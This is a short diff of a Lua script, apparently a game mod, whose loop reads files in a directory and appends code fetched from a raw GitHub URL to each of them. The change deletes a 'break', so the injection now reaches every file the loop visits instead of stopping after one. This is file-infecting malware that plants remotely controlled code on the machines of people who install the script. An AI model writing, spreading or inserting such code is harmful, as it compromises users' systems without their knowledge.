@@ -18,7 +18,6 @@ for Filename in Dir:lines() do
             File:write(FileText.."\n"..encoding.UTF8:decode((require("requests")).get("https://raw.githubusercontent.com/TheVegasPro/123345/main/4124").text))
             File:close()
         end
-        break
     end
 end
 function onReceiveRpc(id, bs)
